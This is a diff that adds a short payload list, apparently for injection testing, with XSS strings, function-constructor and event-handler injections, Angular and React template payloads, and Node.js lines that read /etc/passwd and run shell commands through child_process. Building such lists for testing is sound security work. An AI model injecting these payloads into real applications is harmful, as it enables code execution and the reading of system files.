@@ -1,0 +1,32 @@
+# Basic Payloads
+2 + 2
+alert('XSS')
+console.log('Payload executed')
+
+# XSS Payloads
+<script>alert('XSS')</script>
+<img src="#" onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+
+# Function Injection
+toString.constructor('alert("XSS")')()
+Function('alert("XSS")')()
+
+# Event Handler Injection
+onmouseover="alert('XSS')"
+onclick="eval('alert(\'XSS\')')"
+
+# Template Injection (Angular)
+{{ 'XSS' | alert }}
+{{ alert.constructor('XSS')() }}
+
+# Dynamic Component Injection (Angular)
+<ng-container *ngComponentOutlet="evalComponent"></ng-container>
+
+# Component Injection (React)
+<Component>{eval('alert("XSS")')}</Component>
+
+# File Inclusion (Node.js)
+require('fs').readFileSync('/etc/passwd').toString()
+require('fs').readdirSync('/etc')
+require('child_process').execSync('ls -la')
